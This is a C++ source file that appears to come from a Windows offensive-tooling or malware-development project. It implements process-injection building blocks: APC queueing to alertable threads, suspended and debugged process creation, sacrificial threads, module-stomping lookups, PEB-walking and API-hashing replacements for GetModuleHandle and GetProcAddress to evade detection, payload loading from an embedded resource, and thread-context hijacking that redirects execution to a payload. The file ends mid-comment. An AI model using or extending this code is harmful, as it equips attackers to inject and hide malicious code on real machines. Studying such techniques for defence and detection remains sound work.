#include "SystemInteraction.h"

#include "peImageParser.h"


static VOID AlertableFunction0
(
	IN     VOID
)
{
	SleepEx(100, TRUE);

	printf("[!] APC \"Sleep Ex\" Fired Back!\n");

	return;
}
 
static VOID AlertableFunction1
(
	IN     VOID
)
{
	HANDLE hEvent = CreateEvent(nullptr, FALSE, FALSE, nullptr);

	if (hEvent == nullptr || hEvent == INVALID_HANDLE_VALUE) return; 
	
	WaitForSingleObjectEx(hEvent, 150, TRUE);

	CloseHandle(hEvent);

	printf("[!] APC \"Wait For Single Objects Ex\" Fired Back!\n");

	return;
}

static VOID AlertableFunction2
(
	IN     VOID
)
{
	HANDLE hEvent = CreateEvent(nullptr,FALSE, FALSE, nullptr);

	if (hEvent == nullptr || hEvent == INVALID_HANDLE_VALUE) return;
	
	WaitForMultipleObjectsEx(1, &hEvent,TRUE,150, TRUE);

	CloseHandle(hEvent);
	
	printf("[!] APC \"Wait For Multiple Objects Ex\" Fired Back!\n");

	return;
}

static VOID AlertableFunction3
(
	IN     VOID
)
{

	HANDLE hEvent = CreateEvent(nullptr, FALSE, FALSE, nullptr);

	if (hEvent == nullptr|| hEvent == INVALID_HANDLE_VALUE) return; 
	
	MsgWaitForMultipleObjectsEx(1, &hEvent,150, QS_KEY, MWMO_ALERTABLE);//MWMO_ALERTABLE is a must.

	CloseHandle(hEvent);
	
	printf("[!] APC \"Msg Wait For Multiple Objects Ex\" Fired Back!\n");

	return;
}

static VOID AlertableFunction4
( 
	void
)
{

	HANDLE hEvent1 = CreateEvent(nullptr, FALSE, FALSE, nullptr);

	HANDLE hEvent2 = CreateEvent(nullptr, FALSE, FALSE, nullptr);

	if (hEvent1 && hEvent2) 
	{
		SignalObjectAndWait(hEvent1, hEvent2, 150, TRUE); 		

		CloseHandle(hEvent1);
		CloseHandle(hEvent2);
	}
	printf("[!] APC \"Signal Object And Wait\" Fired Back!\n");

}

static VOID BenignFunction
(
	IN    VOID
)
{
	int x = 0;

	if (5 + 5 == 10) x = 0xC;

	Sleep(x * 1000);

	return;
}

BOOLEAN CreateLocalAlertableThread
(
       OUT PHANDLE phThread,
	   OUT LPDWORD pdwThreadId
)
{
	if (!CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(AlertableFunction0), nullptr, CREATE_SUSPENDED, pdwThreadId)) return FALSE;

	return TRUE;
}

BOOLEAN CreateSacrificialThread
(
	   OUT PDWORD  pdwSacrificialThreadId,
	   OUT PHANDLE phThreadHandle
)
{
	if ((*phThreadHandle = CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(&BenignFunction), nullptr, 0, pdwSacrificialThreadId)) == nullptr) return FALSE;

	if (SuspendThread(*phThreadHandle) == 0xFFFFFFFF) return FALSE;

	return TRUE;
}

BOOLEAN CreateDebuggedProcess
(
	IN     LPSTR   pProcessName,
	   OUT LPDWORD  pdwProcessId,
	   OUT PHANDLE phProcessHandle,
	   OUT PHANDLE phThreadHandle
)
{
	if (!pProcessName || !pdwProcessId || !phProcessHandle || !phThreadHandle) return FALSE;

	CHAR				pWnDr[MAX_PATH]	    = { 0x0 },
						pPath[MAX_PATH * 2] = { 0x0 };
	STARTUPINFOA		StartupInfo_t;
	StartupInfo_t = {StartupInfo_t.cb = sizeof(STARTUPINFO), nullptr};
	PROCESS_INFORMATION ProcessInfo_t		= { nullptr};

	if (!GetEnvironmentVariableA("WinDir", pWnDr, MAX_PATH)) return FALSE;

	if (!sprintf_s(pPath, MAX_PATH, "%s\\System32\\%s", pWnDr, pProcessName)) return FALSE;

	if (!CreateProcessA(nullptr, (LPSTR)pPath, nullptr, nullptr, FALSE, DEBUG_PROCESS, nullptr, nullptr, &StartupInfo_t, &ProcessInfo_t)) return FALSE;

	*pdwProcessId	 = ProcessInfo_t.dwProcessId;
	*phProcessHandle = ProcessInfo_t.hProcess;
	*phThreadHandle  = ProcessInfo_t.hThread;

	if (!*pdwProcessId || !*phProcessHandle || !phThreadHandle) return  FALSE;

	return TRUE;
}

static BOOLEAN CreateSuspendedProcess
(
	IN     PCHAR   pProcessName,
	   OUT PDWORD  pdwProcessId,
	   OUT PHANDLE phProcessHandle,
	   OUT PHANDLE phThreadHandle
)
{
	if (!pProcessName || !pdwProcessId || !phProcessHandle || !phThreadHandle) return FALSE;

	CHAR				pWnDr[MAX_PATH]		= { 0x00 },
						pPath[MAX_PATH * 2] = { 0x00 };
	STARTUPINFOA		StartupInfo_t		= { };
	
	PROCESS_INFORMATION ProcessInfo_t		= { };

	StartupInfo_t.cb = sizeof(STARTUPINFO);

	if (!GetEnvironmentVariableA("WinDir", pWnDr, MAX_PATH)) return FALSE;

	if (!sprintf_s(pPath, MAX_PATH, "%s\\System32\\%s", pWnDr, pProcessName)) return FALSE;

	if (!CreateProcessA(nullptr, pPath, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &StartupInfo_t, &ProcessInfo_t)) return FALSE;

	*pdwProcessId	 = ProcessInfo_t.dwProcessId;
	*phProcessHandle = ProcessInfo_t.hProcess;
	*phThreadHandle  = ProcessInfo_t.hThread;

	if (!*pdwProcessId || !*phProcessHandle || !phThreadHandle) return  FALSE;

	return TRUE;
}

BOOLEAN FetchDrives
(
	IN OUT LPWSTR pPath
)
{
	DWORD dwDrivesBitMask		= NULL;
	USHORT drives_index			= 0x00,
		   loop_index			= 0x00;

	if ((dwDrivesBitMask		= GetLogicalDrives()) == NULL) return FALSE;

	for (loop_index = 0x00; loop_index <= 0x1c; loop_index++)
	{
		if (dwDrivesBitMask     & (1 << loop_index)) 
		{
			pPath[drives_index] = static_cast<WCHAR>(L'A' + loop_index);

			drives_index++;
		}
	}
	pPath[drives_index]			= 0x0000;

	return TRUE;
}

LPWIN32_FIND_DATA_ARRAYW FetchFileArrayW
(
	IN    LPWSTR pPath
)
{
	WIN32_FIND_DATAW		 find_data_t	 = {  };
	LPWIN32_FIND_DATA_ARRAYW pFiles_arr_t	 = nullptr;
	USHORT					 usFileLoopIndex = 0x0000;
	SIZE_T					 sArraySize		 = 0x00000003,
							 sFileName		 = NULL;
	LPWSTR					 pFileName		 = nullptr;


	if ((pFiles_arr_t			 = static_cast<LPWIN32_FIND_DATA_ARRAYW>(malloc(sizeof(WIN32_FIND_DATA_ARRAYW)))) == nullptr) return nullptr;

	if ((pFiles_arr_t->pFilesArr = static_cast<PWIN32_FILE_IN_ARRAY>(calloc(sArraySize, sizeof(WIN32_FILE_IN_ARRAY)))) == nullptr) return nullptr;

	wcscat_s(pPath, MAX_PATH, L"*");

	if ((pFiles_arr_t->hBaseFile = FindFirstFileW(pPath, &find_data_t)) == INVALID_HANDLE_VALUE) return nullptr;

	pPath[wcslen(pPath) - 1] = L'\0';

	while (FindNextFileW(pFiles_arr_t->hBaseFile, &find_data_t))
	{
		if (usFileLoopIndex >= sArraySize / 2 && !FileBufferRoundUP(&sArraySize, &pFiles_arr_t->pFilesArr)) return nullptr;
		

		if (usFileLoopIndex == 0xFFFF) usFileLoopIndex = static_cast<DWORD>(usFileLoopIndex);

		sFileName = wcslen(find_data_t.cFileName);

		if ((pFileName = static_cast<LPWSTR>(LocalAlloc(LPTR, sFileName))) == nullptr) return nullptr;

		wcscpy_s(pFileName, sFileName + 1, find_data_t.cFileName);

		pFileName[sFileName] = 0x0000;

		pFiles_arr_t->pFilesArr[usFileLoopIndex].pFileName = pFileName;

		pFiles_arr_t->pFilesArr[usFileLoopIndex].index = usFileLoopIndex;

		usFileLoopIndex++;
	}

	pFiles_arr_t->count = usFileLoopIndex;

	return pFiles_arr_t;
}

BOOLEAN FetchAlertableThread
(
	IN     DWORD   dwMainThreadId,
	IN     DWORD   dwTargetPID,
	   OUT PDWORD  pdwAlertedThreadId,
	   OUT PHANDLE phAlertedThreadHandle
)
{
	if (!dwMainThreadId || !pdwAlertedThreadId || !phAlertedThreadHandle) return FALSE;

	HANDLE hSnapshot = INVALID_HANDLE_VALUE;

	if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwTargetPID)) == INVALID_HANDLE_VALUE) return FALSE;

	THREADENTRY32 th32ThreadEntry_t = { };

	th32ThreadEntry_t.dwSize = sizeof(THREADENTRY32);

	if (!Thread32First(hSnapshot, &th32ThreadEntry_t)) return FALSE;

	BOOLEAN bState = FALSE;
	do
	{
		if (dwTargetPID == th32ThreadEntry_t.th32OwnerProcessID && dwMainThreadId != th32ThreadEntry_t.th32ThreadID)
		{
			HANDLE hCandidateThread = INVALID_HANDLE_VALUE;

			if ((hCandidateThread = OpenThread(THREAD_SET_CONTEXT, FALSE, th32ThreadEntry_t.th32ThreadID)) == INVALID_HANDLE_VALUE) return FALSE;

			if (QueueUserAPC((PAPCFUNC)AlertableFunction0, hCandidateThread, 0))
			{
				*phAlertedThreadHandle = hCandidateThread;
				*pdwAlertedThreadId    = th32ThreadEntry_t.th32ThreadID;

				bState = TRUE;

				QueueUserAPC((PAPCFUNC)AlertableFunction1, hCandidateThread, 0);

				SleepEx(150, TRUE);

				break;
			}
		}
	}
	while (Thread32Next(hSnapshot, &th32ThreadEntry_t));

	CloseHandle(hSnapshot);
	return bState;
}

BOOLEAN FetchLocalThreadHandle
(
	IN     DWORD   dwMainThreadId,
	   OUT PDWORD  pdwTargetThreadId,
	   OUT PHANDLE phThreadHandle
)
{
	HANDLE        hSnapshot			= INVALID_HANDLE_VALUE;
	BOOLEAN       bState			= FALSE;
	DWORD         dwProcessId		= GetCurrentProcessId();
	THREADENTRY32 th32ThreadEntry_t = { };

	th32ThreadEntry_t.dwSize = sizeof(THREADENTRY32);
\
	if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)) == INVALID_HANDLE_VALUE) goto cleanup;

	if (!Thread32First(hSnapshot, &th32ThreadEntry_t)) goto cleanup;
	do 
	{
		if (!th32ThreadEntry_t.th32OwnerProcessID) continue;

		if (th32ThreadEntry_t.th32OwnerProcessID == dwProcessId && th32ThreadEntry_t.th32ThreadID != dwMainThreadId) goto success;

	} while (Thread32Next(hSnapshot, &th32ThreadEntry_t));

	goto cleanup;

success:
	if (!(*phThreadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, th32ThreadEntry_t.th32ThreadID))) goto cleanup;

	*pdwTargetThreadId = th32ThreadEntry_t.th32ThreadID;

	printf("[+] Found A Target Local Thread!\nTID: %lu\n", *pdwTargetThreadId);

	bState = TRUE;

cleanup:
	if (hSnapshot != INVALID_HANDLE_VALUE) CloseHandle(hSnapshot);

	return bState;
}

static PHANDLE FetchMouseHandle
(
	OUT PWORD pwFoundMiceAmount
)
{
	UINT				uiArrayLength		 = NULL,
						uiCurrentIndex		 = NULL,
						uiDataSize			 = sizeof(RAWINPUTDEVICE);
	PUINT				pMiceOrdinals		 = nullptr;
	PHANDLE				pMiceHandles		 = nullptr;
	PRAWINPUTDEVICELIST pRawInputDevices_arr = nullptr;
	PRID_DEVICE_INFO   *pOutData			 = nullptr; 
	RAWINPUT			mosue_t				 = {};

	GetRawInputBuffer(reinterpret_cast<PRAWINPUT>(&mosue_t), &uiDataSize,sizeof(RAWINPUT));

	if (GetRawInputDeviceList(nullptr, &uiArrayLength, sizeof(RAWINPUTDEVICE)) != 0x00)
	{
		printf("[!] Failed to Retrieve Input Devices Array Size!\n[i] ErrorCode: %lx", GetLastError());

		return nullptr;
	}
	pRawInputDevices_arr = static_cast<PRAWINPUTDEVICELIST>(LocalAlloc(LPTR, uiArrayLength * sizeof(RAWINPUTDEVICE)));

	pMiceHandles = static_cast<PHANDLE>(LocalAlloc(LPTR, uiArrayLength * sizeof(HANDLE)));

	pMiceOrdinals = static_cast<PUINT>(LocalAlloc(LPTR, uiArrayLength * sizeof(WORD)));

	if (pRawInputDevices_arr == nullptr || pMiceHandles == nullptr || pMiceOrdinals == nullptr) return nullptr;

	if (uiArrayLength == 0xFFFFFFFF)
	{
		printf("[!] Failed to Retrieve Input Devices!\n[i] ErrorCode: %lx", GetLastError());

		return nullptr;
	}

	if (pRawInputDevices_arr == nullptr) return nullptr;

	PRAWINPUTDEVICELIST RawInputDevice_arr = nullptr;

	GetRawInputDeviceList(pRawInputDevices_arr, &uiArrayLength, sizeof(RAWINPUTDEVICE));

	while (uiCurrentIndex < uiArrayLength)
	{
		if (pRawInputDevices_arr[uiCurrentIndex].dwType == 0)
		{
			printf("[i] Found a Mouse!\n");

			pMiceHandles[*pwFoundMiceAmount] = pRawInputDevices_arr[uiCurrentIndex].hDevice;

			pMiceOrdinals[*pwFoundMiceAmount] = uiCurrentIndex;

			*pwFoundMiceAmount += 1;
		}
		uiCurrentIndex++;
	}
	pOutData = static_cast<PRID_DEVICE_INFO*>(LocalAlloc(LPTR, *pwFoundMiceAmount * sizeof(PRID_DEVICE_INFO)));

	for (WORD i = 0; i < *pwFoundMiceAmount; i++)
	{
		uiDataSize			= sizeof(RID_DEVICE_INFO);

		pOutData[i]			= static_cast<PRID_DEVICE_INFO>(LocalAlloc(LPTR, sizeof(RID_DEVICE_INFO)));

		pOutData[i]->cbSize = sizeof(RID_DEVICE_INFO);

		GetRawInputDeviceInfoA(pRawInputDevices_arr[pMiceOrdinals[i]].hDevice, RIDI_DEVICEINFO, pOutData[i], &uiDataSize);
	}

	for (WORD i = 0; i < *pwFoundMiceAmount; i++) 
	{
		printf("%lu\n", pOutData[i]->mouse.dwId);

		
	}
	return pMiceHandles;
}

namespace Anonymous
{
	static PPEB FetchProcessEnvironmentBlock
	(
		IN     VOID
	)
	{
#ifdef _WIN64
		PPEB pPeb = (PEB*)__readgsqword(0x60);
#elif  _WIN32
		PPEB pPeb = (PEB*)(__readfsdword(0x30));
#endif
		return pPeb;
	}
}

BOOLEAN FetchProcessHandleEnumProcesses
(
	IN     LPWSTR    lpTagetProcessName,
	   OUT PDWORD    pdwTargetProcessId,
	   OUT HANDLE   *phTargetProcessHandle
)
{
	if (lpTagetProcessName == nullptr || pdwTargetProcessId == nullptr || phTargetProcessHandle == nullptr) return FALSE;

	BOOLEAN  bState						   = FALSE;
	DWORD    dwReturnLen1				   = 0,
			 dwReturnLen2				   = 0,
			 dwProcesses_arr[2048]		   = { NULL };
	WCHAR    wcEnumeratedProcess[MAX_PATH] = { NULL };
	HMODULE	 EnumeratedModule			   = nullptr;
	HANDLE	 hProcess					   = INVALID_HANDLE_VALUE;

	if (!EnumProcesses(dwProcesses_arr, sizeof(dwProcesses_arr), &dwReturnLen1)) return FALSE;

	USHORT dwPIDAmount					   = static_cast<USHORT>(dwReturnLen1 / sizeof(DWORD));

	for (USHORT i = 0; i < dwPIDAmount; i++)
	{
		
		if ((hProcess					   = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcesses_arr[i])) == nullptr) continue;

		if (!EnumProcessModules(hProcess, &EnumeratedModule, sizeof(HMODULE), &dwReturnLen2)) goto InnerCleanUp;

		if (!GetModuleBaseName(hProcess, EnumeratedModule, wcEnumeratedProcess, sizeof(wcEnumeratedProcess) / sizeof(WCHAR))) goto InnerCleanUp;

		if (_wcsicmp(wcEnumeratedProcess, lpTagetProcessName) == 0)
		{
			*pdwTargetProcessId	   = dwProcesses_arr[i];

			*phTargetProcessHandle = hProcess;

			bState				   = TRUE;

			break;
		}
	InnerCleanUp:
		if (hProcess) CloseHandle(hProcess);
	}

	return bState;
}

BOOLEAN FetchProcessHandleHelpTool32
(
	IN     LPWSTR  pwTargetProcessName,
	   OUT PDWORD  pdwTargetProcessIdAddress,
	   OUT PHANDLE phTargetProcessHandleAddress
)
{
	if (!pwTargetProcessName || !pdwTargetProcessIdAddress || !phTargetProcessHandleAddress) return FALSE;

	HANDLE hSnapshot = INVALID_HANDLE_VALUE;

	BOOLEAN bState	 = FALSE;

	PROCESSENTRY32 process_entry32_t = { };

	process_entry32_t.dwSize = sizeof(PROCESSENTRY32);

	if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE) goto _cleanup;

	if (!Process32First(hSnapshot, &process_entry32_t)) goto _cleanup;

	do
	{
		if (_wcsicmp(process_entry32_t.szExeFile, pwTargetProcessName) != 0) continue;

		*phTargetProcessHandleAddress = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_entry32_t.th32ProcessID);

		*pdwTargetProcessIdAddress = process_entry32_t.th32ProcessID;

		bState = TRUE;

		break;

	} while (Process32Next(hSnapshot, &process_entry32_t));

_cleanup:
	if (hSnapshot) CloseHandle(hSnapshot);
	return bState;
}

BOOLEAN FetchProcessHandleNtQuerySystemInformation
(
	IN     LPCWSTR szProcName,
	IN OUT PDWORD  pdwPid,
	   OUT PHANDLE phProcess
)
{
	ULONG                        ulReturnedLengthValue1		 = 0,
								 ulReturnedLengthValue2		 = 0;
	PSYSTEM_PROCESS_INFORMATION  pSystemProcessInformation_t = nullptr;
	BOOLEAN                      bState						 = FALSE;
	fnNtQuerySystemInformation   pfNtQuerySystemInformation	 = nullptr;
	

	if ((pfNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcessAddressReplacement(GetModuleHandleReplacement(const_cast<LPWSTR>(L"ntdll.dll")), const_cast<LPSTR>("NtQuerySystemInformation"))) == nullptr) return FALSE;

	pfNtQuerySystemInformation(SystemProcessInformation, nullptr, 0, &ulReturnedLengthValue1);

	if ((pSystemProcessInformation_t = (PSYSTEM_PROCESS_INFORMATION)LocalAlloc(LPTR, ulReturnedLengthValue1)) == nullptr) return FALSE;

	PVOID pValueToFree = pSystemProcessInformation_t;

	if (pfNtQuerySystemInformation(SystemProcessInformation, pSystemProcessInformation_t, ulReturnedLengthValue1, &ulReturnedLengthValue2) != 0) goto _cleanup;

	while (TRUE)
	{
		if (pSystemProcessInformation_t->ImageName.Length && _wcsicmp(pSystemProcessInformation_t->ImageName.Buffer, szProcName) == 0) 
		{
			*pdwPid	   = (DWORD)pSystemProcessInformation_t->UniqueProcessId;
			*phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *pdwPid);

			if (*phProcess == 0 || *phProcess == INVALID_HANDLE_VALUE) 
			{
				pSystemProcessInformation_t = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)pSystemProcessInformation_t + pSystemProcessInformation_t->NextEntryOffset);
				continue;
			}

			bState = TRUE;

		_cleanup:

			if (pSystemProcessInformation_t != nullptr) LocalFree(pValueToFree);

			pSystemProcessInformation_t = nullptr;

			return bState;
		}

		if (!pSystemProcessInformation_t->NextEntryOffset) goto _cleanup;

		pSystemProcessInformation_t = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)pSystemProcessInformation_t + pSystemProcessInformation_t->NextEntryOffset);
	}
}

BOOLEAN FetchRemoteThreadHandle
(
	IN     DWORD   dwProcessId, 
	   OUT PDWORD  pdwThreadId,
	   OUT PHANDLE phThreadHandle
)
{
	if (!dwProcessId || !pdwThreadId || !phThreadHandle) return FALSE;

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwProcessId);

	if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

	BOOLEAN bState = FALSE;

	THREADENTRY32 th32Thread_t = { };

	th32Thread_t.dwSize = sizeof(THREADENTRY32);

	if (!Thread32First(hSnapshot, &th32Thread_t)) goto cleanup;

	do
	{

		if (th32Thread_t.th32OwnerProcessID == dwProcessId)
		{
			*pdwThreadId    = th32Thread_t.th32ThreadID;
			*phThreadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, *pdwThreadId);
			if (!*phThreadHandle) goto cleanup;
			bState = TRUE;
			break;
		}

	} while (Thread32Next(hSnapshot, &th32Thread_t));

cleanup:

	CloseHandle(hSnapshot);

	return bState;
}

BOOLEAN FetchResource
(
	   OUT pRESOURCE pResource_t
)
{
	HRSRC   hRsrc   = nullptr;
	HGLOBAL hGlobal = nullptr;

	if ((hRsrc = FindResourceW(nullptr, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA)) == nullptr) return FALSE;

	if ((hGlobal = LoadResource(nullptr, hRsrc)) == nullptr) return FALSE;

	if ((pResource_t->pAddress = LockResource(hGlobal)) == nullptr) return FALSE;

	if ((pResource_t->sSize = SizeofResource(nullptr, hRsrc)) == 0) return FALSE;

	return TRUE;
}

BOOL FetchStompingTarget
(
	IN     LPSTR   pSacrificialDllName,
	IN     LPSTR   pSacrificialFuncName,
	   OUT PVOID  *pTargetFunctionAddress
)
{
	if (!pSacrificialDllName || !pSacrificialFuncName || !pTargetFunctionAddress) return FALSE;

	HMODULE hSacrificialModule = nullptr;

	if ((hSacrificialModule = LoadLibraryA(pSacrificialDllName)) == nullptr)
	{
		printf("[!] Failed To Load Dll: %s\n", pSacrificialDllName);
		return FALSE;
	}
	
	if ((*pTargetFunctionAddress = (PVOID)GetProcAddress(hSacrificialModule, pSacrificialFuncName)) == nullptr) 
	{
		printf("[!] Failed To Load Function: %s\n", pSacrificialFuncName);
		return FALSE;
	}
	return TRUE;
}

HMODULE GetModuleHandleReplacement
(
	IN     LPCWSTR lpwTargetModuleName
)
{
	PPEB				  pProcessEnvironmentBlock = Anonymous::FetchProcessEnvironmentBlock();
	PLDR_DATA_TABLE_ENTRY pLDRDataTableEntry	   = reinterpret_cast<PLDR_DATA_TABLE_ENTRY>(pProcessEnvironmentBlock->Ldr->InMemoryOrderModuleList.Flink);
	PLIST_ENTRY			  pListHead				   = &pProcessEnvironmentBlock->Ldr->InMemoryOrderModuleList,
						  pCurrentListNode		   = pListHead->Flink;
	do
	{
		if (pLDRDataTableEntry->FullDllName.Length != 0) 
		{
			if (_wcsicmp(pLDRDataTableEntry->FullDllName.Buffer, lpwTargetModuleName) == 0)
			{
				return static_cast<HMODULE>(pLDRDataTableEntry->Reserved2[0]);
			}
			pLDRDataTableEntry = reinterpret_cast<PLDR_DATA_TABLE_ENTRY>(pCurrentListNode->Flink);

			pCurrentListNode   = pCurrentListNode->Flink;
		}
	}
	while (pListHead != pCurrentListNode);
	
	return nullptr;
}

HMODULE GetModuleHandleReplacementH
(
	IN    DWORD dwTargetModuleName
)
{
	PPEB				  pProcessEnvironmentBlock_t = Anonymous::FetchProcessEnvironmentBlock();
	PPEB_LDR_DATA		  pLoaderDataTable_t		 = pProcessEnvironmentBlock_t->Ldr;
	PLDR_DATA_TABLE_ENTRY pDataEntryDataTable_t		 = reinterpret_cast<PLDR_DATA_TABLE_ENTRY>(pLoaderDataTable_t->InMemoryOrderModuleList.Flink);
	PLIST_ENTRY			  pListHead					 = &pProcessEnvironmentBlock_t->Ldr->InMemoryOrderModuleList,
						  pCurrentListNode			 = pListHead->Flink;
	DWORD				  dwCandidate				 = NULL;
	do
	{
		if (pDataEntryDataTable_t->FullDllName.Length != NULL)
		{
			dwCandidate = HASHW(pDataEntryDataTable_t->FullDllName.Buffer);

			if (dwCandidate == dwTargetModuleName)
			{
				return static_cast<HMODULE>(pDataEntryDataTable_t->Reserved2[0]);
			}
			pDataEntryDataTable_t = reinterpret_cast<PLDR_DATA_TABLE_ENTRY>(pCurrentListNode->Flink);

			pCurrentListNode = pCurrentListNode->Flink;
		}
	}
	while (pListHead != pCurrentListNode);

	return nullptr;
}

FARPROC GetProcessAddressReplacement
(
	IN     HMODULE Target_hModule,
	IN     LPSTR   lpTargetApiName
)
{
	PBYTE					pModuleBaseAddress			= reinterpret_cast<PBYTE>(Target_hModule);
	PIMAGE_EXPORT_DIRECTORY pModuleExportDirectory		= nullptr;
	PDWORD					pdwFunctionsNamesRVA_arr	= nullptr,
							pdwFunctionsRVA_arr			= nullptr;
	PWORD					pwFunctionsRVAOrdinals_arr  = nullptr;
	FARPROC				    fnTargetFunction			= nullptr;

	if (FetchImageExportDirectory(pModuleBaseAddress, &pModuleExportDirectory) == FALSE) return  nullptr;

	pdwFunctionsNamesRVA_arr   = reinterpret_cast<PDWORD>(pModuleBaseAddress + pModuleExportDirectory->AddressOfNames);

	pdwFunctionsRVA_arr		   = reinterpret_cast<PDWORD>(pModuleBaseAddress + pModuleExportDirectory->AddressOfFunctions);

	pwFunctionsRVAOrdinals_arr = reinterpret_cast<PWORD>(pModuleBaseAddress  + pModuleExportDirectory->AddressOfNameOrdinals);

	for (DWORD i = 0; i < pModuleExportDirectory->NumberOfNames; i++)
	{
		if (strcmp(lpTargetApiName, reinterpret_cast<PCHAR>(pModuleBaseAddress + pdwFunctionsNamesRVA_arr[i])) != 0) continue;

		WORD wFunctionsOrdinal	= pwFunctionsRVAOrdinals_arr[i];

		fnTargetFunction		= reinterpret_cast<FARPROC>(pModuleBaseAddress + pdwFunctionsRVA_arr[wFunctionsOrdinal]);

		break;
	}

	return fnTargetFunction;
}

FARPROC GetProcessAddressReplacementH
(
	IN     HMODULE Target_hModule,
	IN     DWORD   dwTargetApiHash
)
{
	if (!Target_hModule || !dwTargetApiHash) return nullptr;

	PBYTE					pImageBase				= reinterpret_cast<PBYTE>(Target_hModule);
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory_t	= nullptr;

	if (FetchImageExportDirectory(pImageBase, &pImageExportDirectory_t) == FALSE) return nullptr;
	
	PDWORD				pdwFunctionsNamesRVA_arr	= reinterpret_cast<PDWORD>(pImageBase + pImageExportDirectory_t->AddressOfNames),
						pdwFunctionsRVA_arr			= reinterpret_cast<PDWORD>(pImageBase + pImageExportDirectory_t->AddressOfFunctions);
	PWORD				pwFunctionsOrdinalsRVA_arr  = reinterpret_cast<PWORD >(pImageBase + pImageExportDirectory_t->AddressOfNameOrdinals);
	DWORD				dwCandidateHash				= NULL;
	LPSTR				lpFunctionName				= nullptr;

	for (DWORD i = 0; i < pImageExportDirectory_t->NumberOfFunctions; i++)
	{
		lpFunctionName = reinterpret_cast<LPSTR>(pImageBase + pdwFunctionsNamesRVA_arr[i]);

		if (HASHA(lpFunctionName, 5) == dwTargetApiHash) return reinterpret_cast<FARPROC>(pImageBase + pdwFunctionsRVA_arr[pwFunctionsOrdinalsRVA_arr[i]]);
		
	}
	return nullptr;
}

BOOLEAN HijackThread
(
	IN     HANDLE hThread,
	IN     PUCHAR pPayloadAddress
)
{
	if (!pPayloadAddress || !hThread) return FALSE;

	CONTEXT cThreadContext_t = { };

	SuspendThread(hThread);

	cThreadContext_t.ContextFlags = CONTEXT_CONTROL;

	if (!GetThreadContext(hThread, &cThreadContext_t)) return FALSE;

	cThreadContext_t.Rip = (ULONGLONG)pPayloadAddress;

	if (!SetThreadContext(hThread, &cThreadContext_t)) return FALSE;

	ResumeThread(hThread);

	WaitForSingleObject(hThread, INFINITE);

	return TRUE;
}

BOOLEAN HijackLocalThread
(
	IN     HANDLE hThread, 
	IN     PUCHAR pPayloadAddress,
	IN     SIZE_T sPayloadSize
)
{
	if (!hThread || !pPayloadAddress || !sPayloadSize) return FALSE;

	CONTEXT cThreadContext_t = {};

	cThreadContext_t.ContextFlags = CONTEXT_CONTROL;

	if (!GetThreadContext(hThread, &cThreadContext_t))
	{
		SuspendThread(hThread);
		if (!GetThreadContext(hThread, &cThreadContext_t))return FALSE;
	}

	PVOID   pExecutionAddress;
	DWORD   dwOldProtections;

	if (!(pExecutionAddress = VirtualAlloc(nullptr, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return FALSE;

	memcpy(pExecutionAddress, pPayloadAddress, sPayloadSize);

	cThreadContext_t.Rip = (ULONGLONG)pExecutionAddress;

	if (!SetThreadContext(hThread, &cThreadContext_t)) return  FALSE;

	if (!VirtualProtect(pExecutionAddress, sPayloadSize, PAGE_EXECUTE_READ , &dwOldProtections)) return FALSE;

	if (ResumeThread(hThread) == -1) return FALSE;

	WaitForSingleObject(hThread, INFINITE);
	
	return TRUE;
}

BOOLEAN LogConsoleMouseClicks
(
	IN	   VOID
)
{
	HANDLE			   hConsoleHandle	  = INVALID_HANDLE_VALUE;
	DWORD			   dwPrevInputMode	  = NULL,
					   dwNewInputMode	  = ENABLE_EXTENDED_FLAGS | ENABLE_MOUSE_INPUT,
					   dwClicksToCatch	  = NULL,
					   dwNumEventsRead	  = NULL;
	INPUT_RECORD	   input_record_t	  = { };
	MOUSE_EVENT_RECORD MouseEventRecord_t = { };

	printf("[i] Looking For Mouse Clicks...\n");

	hConsoleHandle = GetStdHandle(STD_INPUT_HANDLE);

	if (!GetConsoleMode(hConsoleHandle, &dwPrevInputMode))	return FALSE;

	if (!SetConsoleMode(hConsoleHandle, dwNewInputMode))	return FALSE;

	while (dwClicksToCatch < 10)
	{
		if (!ReadConsoleInputA(hConsoleHandle, &input_record_t, 1, &dwNumEventsRead)) return FALSE;

		if (input_record_t.EventType != MOUSE_EVENT) continue;

		 MouseEventRecord_t = reinterpret_cast<MOUSE_EVENT_RECORD&>(input_record_t.Event.MouseEvent);

		if (MouseEventRecord_t.dwButtonState & RI_MOUSE_LEFT_BUTTON_DOWN)
		{
			printf("\t[+] Left  Mouse Click Detected at (%u, %u)!\n", MouseEventRecord_t.dwMousePosition.X, MouseEventRecord_t.dwMousePosition.Y);

			dwClicksToCatch++;
		}

		if (MouseEventRecord_t.dwButtonState & RIGHTMOST_BUTTON_PRESSED)
		{
			printf("\t[+] Right Mouse Click Detected at (%u, %u)!\n", MouseEventRecord_t.dwMousePosition.X, MouseEventRecord_t.dwMousePosition.Y);

			dwClicksToCatch++;
		}
	}

	return TRUE;
}

VOID MiceHandlesTests()
{
	/*
	if ((lresult = DefWindowProcA(GetConsoleWindow(), WM_MBUTTONDBLCLK, wParam, uiDeviceDataSize)) != 0)
	{
		printf("[!] Failed to Retrieve Mouse Data!\n[i] ErrorCode: %lx", GetLastError());

		return FALSE;
	}

	while (true)
	{
